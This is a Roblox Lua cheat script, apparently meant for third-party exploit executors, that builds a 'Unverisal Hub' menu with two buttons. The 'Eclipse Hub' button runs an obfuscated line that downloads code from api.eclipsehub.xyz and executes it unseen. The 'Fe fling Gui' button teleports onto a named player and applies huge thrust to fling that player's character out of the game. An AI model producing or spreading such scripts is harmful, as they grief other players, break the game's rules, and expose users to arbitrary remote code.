-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Buttons = Instance.new("Folder")
local OneButton = Instance.new("TextButton")
local twoButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = ScreenGui
Main.BackgroundColor3 = Color3.fromRGB(94, 115, 255)
Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.277070075, 0, 0.295138896, 0)
Main.Size = UDim2.new(0.445859879, 0, 0.407318383, 0)

Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.fromRGB(1, 35, 255)
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(1, 0, 0.101639345, 0)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "Unverisal Hub"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true

Buttons.Name = "Buttons"
Buttons.Parent = Main

OneButton.Name = "OneButton"
OneButton.Parent = Buttons
OneButton.BackgroundColor3 = Color3.fromRGB(1, 35, 255)
OneButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
OneButton.BorderSizePixel = 0
OneButton.Position = UDim2.new(0.0161125325, 0, 0.137704924, 0)
OneButton.Size = UDim2.new(0.186188638, 0, 0.124590166, 0)
OneButton.Font = Enum.Font.SourceSansBold
OneButton.Text = "Eclipse Hub"
OneButton.TextColor3 = Color3.fromRGB(255, 255, 255)
OneButton.TextScaled = true
OneButton.TextSize = 14.000
OneButton.TextWrapped = true

twoButton.Name = "twoButton"
twoButton.Parent = Buttons
twoButton.BackgroundColor3 = Color3.fromRGB(1, 35, 255)
twoButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
twoButton.BorderSizePixel = 0
twoButton.Position = UDim2.new(0.239896953, 0, 0.137704924, 0)
twoButton.Size = UDim2.new(0.186188638, 0, 0.124590166, 0)
twoButton.Font = Enum.Font.SourceSansBold
twoButton.Text = "Fe fling Gui"
twoButton.TextColor3 = Color3.fromRGB(255, 255, 255)
twoButton.TextScaled = true
twoButton.TextSize = 14.000
twoButton.TextWrapped = true

-- Scripts:

local function XFJK_fake_script() -- Main.SmoothDrag 
	local script = Instance.new('LocalScript', Main)

	local Drag = script.Parent
	local gsCoreGui = game:GetService("CoreGui")
	local gsTween = game:GetService("TweenService")
	local UserInputService = game:GetService("UserInputService")
		local dragging
		local dragInput
		local dragStart
		local startPos
		local function update(input)
			local delta = input.Position - dragStart
			local dragTime = 0.04
			local SmoothDrag = {}
			SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			local dragSmoothFunction = gsTween:Create(Drag, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
			dragSmoothFunction:Play()
		end
		Drag.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = Drag.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)
		Drag.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging and Drag.Size then
				update(input)
			end
		end)
	
end
coroutine.wrap(XFJK_fake_script)()
local function QDRRBL_fake_script() -- Main.FunctionButton 
	local script = Instance.new('LocalScript', Main)

	local mainframe = script.Parent
	local ButtonsFolder = mainframe.Buttons
	
	--OneButton
	
	ButtonsFolder.OneButton.MouseEnter:Connect(function()
		ButtonsFolder.OneButton.Text = "Eclipse Hub - supports multiple games, and new features come every week."
	end)
	
	ButtonsFolder.OneButton.MouseLeave:Connect(function()
		ButtonsFolder.OneButton.Text = "Eclipse Hub"
	end)
	
	ButtonsFolder.OneButton.MouseButton1Click:Connect(function()
		getgenv().mainKey = "nil"
	
		local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
	end)
	
	--twobutton
	
	ButtonsFolder.twoButton.MouseEnter:Connect(function()
		ButtonsFolder.twoButton.Text = "Fe fling Gui - (Troll Face editon)"
	end)
	
	ButtonsFolder.twoButton.MouseLeave:Connect(function()
		ButtonsFolder.twoButton.Text = "Fe fling Gui"
	end)
	
	ButtonsFolder.twoButton.MouseButton1Click:Connect(function()
		local lp = game:FindService("Players").LocalPlayer
	
		local function gplr(String)
			local Found = {}
			local strl = String:lower()
			if strl == "all" then
				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
					table.insert(Found,v)
				end
			elseif strl == "others" then
				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
					if v.Name ~= lp.Name then
						table.insert(Found,v)
					end
				end 
			elseif strl == "me" then
				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
					if v.Name == lp.Name then
						table.insert(Found,v)
					end
				end 
			else
				for i,v in pairs(game:FindService("Players"):GetPlayers()) do
					if v.Name:lower():sub(1, #String) == String:lower() then
						table.insert(Found,v)
					end
				end 
			end
			return Found 
		end
	
		local function notif(str,dur)
			game:FindService("StarterGui"):SetCore("SendNotification", {
				Title = "yeet gui",
				Text = str,
				Icon = "rbxassetid://2005276185",
				Duration = dur or 3
			})
		end
	
		--// sds
	
		local h = Instance.new("ScreenGui")
		local Main = Instance.new("ImageLabel")
		local Top = Instance.new("Frame")
		local Title = Instance.new("TextLabel")
		local TextBox = Instance.new("TextBox")
		local TextButton = Instance.new("TextButton")
	
		h.Name = "h"
		h.Parent = game:GetService("CoreGui")
		h.ResetOnSpawn = false
	
		Main.Name = "Main"
		Main.Parent = h
		Main.Active = true
		Main.Draggable = true
		Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Main.BorderSizePixel = 0
		Main.Position = UDim2.new(0.174545452, 0, 0.459574461, 0)
		Main.Size = UDim2.new(0, 454, 0, 218)
		Main.Image = "rbxassetid://2005276185"
	
		Top.Name = "Top"
		Top.Parent = Main
		Top.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
		Top.BorderSizePixel = 0
		Top.Size = UDim2.new(0, 454, 0, 44)
	
		Title.Name = "Title"
		Title.Parent = Top
		Title.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0, 0, 0.295454562, 0)
		Title.Size = UDim2.new(0, 454, 0, 30)
		Title.Font = Enum.Font.SourceSans
		Title.Text = "fe yeet gui"
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextScaled = true
		Title.TextSize = 14.000
		Title.TextWrapped = true
	
		TextBox.Parent = Main
		TextBox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
		TextBox.BorderSizePixel = 0
		TextBox.Position = UDim2.new(0.0704845786, 0, 0.270642221, 0)
		TextBox.Size = UDim2.new(0, 388, 0, 62)
		TextBox.Font = Enum.Font.SourceSans
		TextBox.PlaceholderText = "Insert their Username"
		TextBox.Text = ""
		TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextBox.TextScaled = true
		TextBox.TextSize = 14.000
		TextBox.TextWrapped = true
	
		TextButton.Parent = Main
		TextButton.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
		TextButton.BorderSizePixel = 0
		TextButton.Position = UDim2.new(0.10352423, 0, 0.596330225, 0)
		TextButton.Size = UDim2.new(0, 359, 0, 50)
		TextButton.Font = Enum.Font.SourceSans
		TextButton.Text = "Cheese em'"
		TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		TextButton.TextScaled = true
		TextButton.TextSize = 14.000
		TextButton.TextWrapped = true
	
		TextButton.MouseButton1Click:Connect(function()
			local Target = gplr(TextBox.Text)
			if Target[1] then
				Target = Target[1]
	
				local Thrust = Instance.new('BodyThrust', lp.Character.HumanoidRootPart)
				Thrust.Force = Vector3.new(9999,9999,9999)
				Thrust.Name = "YeetForce"
				repeat
					lp.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
					Thrust.Location = Target.Character.HumanoidRootPart.Position
					game:FindService("RunService").Heartbeat:wait()
				until not Target.Character:FindFirstChild("Head")
			else
				notif("that player left or doesnt exist.. sry")
			end
		end)
	
		--//fsddfsdf
		notif("loaded! by scuba#0001", 5)
	end)
end
coroutine.wrap(QDRRBL_fake_script)()
